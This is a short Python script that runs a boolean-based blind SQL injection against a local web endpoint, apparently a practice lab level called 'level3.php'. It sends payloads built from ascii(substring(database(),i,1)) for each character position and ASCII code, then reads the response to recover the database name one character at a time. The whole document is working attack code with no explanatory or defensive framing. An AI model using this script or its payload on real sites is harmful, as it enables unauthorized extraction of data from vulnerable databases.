import requests

url = "http://127.0.0.1:12000/level3.php?q=yahoo"
db_name = ""


db_length = 6


for i in range(1, db_length + 1):
    for ascii_code in range(32, 127): 
        payload = f"' and 1=if((ascii(substring(database(),{i},1))={ascii_code}),1,2)-- "
        full_url = url + payload
        response = requests.get(full_url)

        
        if "Free realistic account credentials" in response.text:
            db_name += chr(ascii_code)
            print(f"Found character {i}: {chr(ascii_code)}")
            break

print(f"Database name: {db_name}")
